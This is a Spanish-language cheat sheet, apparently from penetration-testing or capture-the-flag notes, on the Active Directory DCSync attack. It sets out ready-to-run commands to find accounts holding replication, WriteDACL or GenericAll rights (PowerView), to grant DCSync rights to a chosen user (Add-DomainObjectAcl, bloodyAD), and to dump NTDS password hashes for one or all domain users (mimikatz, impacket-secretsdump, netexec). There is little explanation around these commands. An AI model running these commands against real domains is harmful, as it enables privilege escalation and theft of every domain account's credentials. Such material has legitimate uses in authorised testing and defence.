DCSync Attack

DCSync permite solicitar replicación de secretos del dominio cuando una cuenta tiene permisos de replicación o puede asignárselos mediante ACL.

Aviso: DCSync attack abusa del protocolo de replicación de AD para solicitar secretos del dominio como si la cuenta tuviera permisos de replicación equivalentes a los de un DC.

Aviso: hacen falta permisos DCSync o permisos equivalentes como GenericAll / WriteDACL sobre el dominio.

- DS-Replication-Get-Changes (Replicating Directory Changes)

- DS-Replication-Get-Changes-All (Replicating Directory Changes All)

Un usuario del grupo Exchange Windows Permissions o con privilegios WriteDACL sobre el dominio puede asignarse permisos DCSync y ejecutar el ataque. Si los permisos solo aplican sobre un objeto concreto, el alcance queda limitado a ese objeto.

Enumerar Usuarios con Permisos DCSync, WriteDACL o GenericAll

PowerView.ps1

PowerShell: PowerView -> Enumerar usuarios con permisos DCSync

. .\PowerView.ps1

Get-ObjectAcl -DistinguishedName "dc=<dominio>,dc=<dominio>" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}

Otorgar permisos DCSync (WriteDACL)

PowerShell: Otorgar permisos DCSync con PowerView

. .\PowerView.ps1
# Actor: Usuario con privilegios (WriteDACL) para poder otorgar permisos DCSync 
# Beneficiado: Usuario que recibirá permisos DCSync. Actor puede ser Beneficiado también
$SecPass = ConvertTo-SecureString <password_actor> -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<dominio>.<dominio>\<user_actor>', $SecPass)
# Si omites "-Credential $Cred" se tomará las credenciales del usuario actual como Actor
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=<dominio>,DC=<dominio>" -PrincipalIdentity <user_beneficiado> -Rights DCSync

Kali: Otorgar permisos DCSync

bloodyAD --host <hostname>.<dominio> --dc-ip <ip_dc> -d "<dominio>" -u '<user_actor>' -p '<password_actor>' add dcsync "<user_beneficiado>"

Volcar NTDS (Permisos DCSync)

PowerShell: Volcar NTDS.dit con el usuario con permisos DCSync

mimikatz.exe
privilege::debug
# Volcar NTDS de todos los usuarios del dominio: htb.local
lsadump::dcsync /domain:<domain>.<domain> /all
# Volcar NTDS de un usuario. Ej. /user:Administrator /user:htb\krbtgt
lsadump::dcsync /domain:<domain>.<domain> /user:<user>

Kali: Volcar NTDS con el usuario con permisos DCSync

# Impacket
impacket-secretsdump <domain>/<user>:<password>@<ip_dc>
impacket-secretsdump '<user>:<password>@<ip_dc>' -just-dc-ntlm
# Netexec
netexec smb <ip_dc> -u <user> -p <pass> --ntds
